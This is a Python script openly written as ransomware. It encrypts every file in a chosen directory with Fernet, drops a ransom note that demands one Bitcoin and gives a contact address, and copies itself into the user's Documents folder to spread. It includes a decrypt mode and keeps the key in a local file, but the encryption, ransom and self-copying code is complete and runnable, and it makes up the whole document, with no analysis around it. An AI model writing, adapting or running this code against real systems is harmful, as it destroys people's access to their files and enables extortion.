from cryptography.fernet import Fernet
import os
import sys
import shutil

# Generate or load encryption key
KEY_FILE = "ransomware_key.key"
RANSOM_NOTE = "RANSOM_NOTE.txt"


def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)


def load_key():
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()


try:
    KEY = load_key()
except FileNotFoundError:
    generate_key()
    KEY = load_key()

encryptor = Fernet(KEY)


# Function to encrypt files
def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        file_data = f.read()
    encrypted_data = encryptor.encrypt(file_data)
    with open(file_path, "wb") as f:
        f.write(encrypted_data)
    print(f"[+] Encrypted: {file_path}")


# Function to decrypt files
def decrypt_file(file_path):
    with open(file_path, "rb") as f:
        encrypted_data = f.read()
    decrypted_data = encryptor.decrypt(encrypted_data)
    with open(file_path, "wb") as f:
        f.write(decrypted_data)
    print(f"[+] Decrypted: {file_path}")


# Function to encrypt all files in a directory
def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file != RANSOM_NOTE and file != KEY_FILE:
                file_path = os.path.join(root, file)
                encrypt_file(file_path)
    create_ransom_note(directory)
    spread_ransomware(directory)


# Function to create a ransom note
def create_ransom_note(directory):
    ransom_message = (
        "Your files have been encrypted!\n"
        "To retrieve them, send 1 Bitcoin to the following address: xyz123\n"
        "After payment, send proof to hacker@darkweb.com for decryption instructions."
    )
    ransom_path = os.path.join(directory, RANSOM_NOTE)
    with open(ransom_path, "w") as f:
        f.write(ransom_message)
    print(f"[!] Ransom note created at {ransom_path}")


# Function to decrypt all files in a directory
def decrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file != RANSOM_NOTE and file != KEY_FILE:
                file_path = os.path.join(root, file)
                decrypt_file(file_path)
    remove_ransom_note(directory)


# Function to remove the ransom note
def remove_ransom_note(directory):
    ransom_path = os.path.join(directory, RANSOM_NOTE)
    if os.path.exists(ransom_path):
        os.remove(ransom_path)
        print(f"[+] Ransom note removed from {ransom_path}")


# Function to spread ransomware by copying itself to another directory
def spread_ransomware(directory):
    target_dir = os.path.expanduser("~/Documents")  # Spreading to Documents folder
    if directory != target_dir:
        try:
            shutil.copy(__file__, os.path.join(target_dir, "ransomware_spread.py"))
            print(f"[!] Ransomware copied to {target_dir}")
        except Exception as e:
            print(f"[-] Failed to spread ransomware: {e}")


if __name__ == "__main__":
    mode = input("Choose mode (1: Encrypt, 2: Decrypt): ")
    target_directory = input("Enter directory path: ")
    
    if mode == "1":
        encrypt_directory(target_directory)
    elif mode == "2":
        decrypt_directory(target_directory)
    else:
        print("[-] Invalid option. Exiting.")
